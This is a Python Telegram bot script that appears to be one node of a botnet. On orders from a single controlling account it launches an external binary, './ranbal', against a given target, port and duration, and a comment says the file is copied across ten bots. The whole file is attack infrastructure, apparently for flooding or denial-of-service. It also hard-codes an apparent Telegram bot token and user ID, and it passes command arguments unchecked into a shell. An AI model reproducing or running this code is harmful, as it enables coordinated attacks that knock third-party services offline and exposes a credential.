import telebot
import subprocess
import re
import psutil
import os
import signal
from keep_alive import keep_alive
keep_alive()

BOT_ID = 1  # Replace with 2, 3, ..., 10 in each file
bot = telebot.TeleBot(os.environ.get("7404886490:AAFCCSK4RyAibTXFER66s4sbrzhM5ZXi9uY"))  # Change token name per bot
MAIN_BOT_USER_ID = int(os.environ.get("1163610781", 0))

def stop_attack():
    for proc in psutil.process_iter(attrs=['pid', 'cmdline']):
        try:
            if proc.info['cmdline'] and "./ranbal" in proc.info['cmdline']:
                os.kill(proc.info['pid'], signal.SIGTERM)
                return f"BOT{BOT_ID}: Attack stopped."
        except:
            continue
    return f"BOT{BOT_ID}: No active attack found."

def start_attack(target, port, duration, message):
    try:
        command = f"./ranbal {target} {port} {duration}"
        bot.reply_to(message, f"BOT{BOT_ID}: Attack started on {target}:{port} for {duration}s.")
        subprocess.run(command, shell=True)
        bot.reply_to(message, f"BOT{BOT_ID}: ATTACK COMPLETED.")
    except Exception as e:
        bot.reply_to(message, f"BOT{BOT_ID}: Error: {e}")

@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    if message.from_user.id != MAIN_BOT_USER_ID:
        return
    text = message.text.strip()
    if text == f"BOT{BOT_ID}_STOP":
        result = stop_attack()
        bot.reply_to(message, result)
    else:
        pattern = rf"^BOT{BOT_ID}_ATTACK:\s*(\S+)\s+(\d+)\s+(\d+)$"
        match = re.match(pattern, text)
        if match:
            target, port, duration = match.groups()
            start_attack(target, int(port), int(duration), message)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)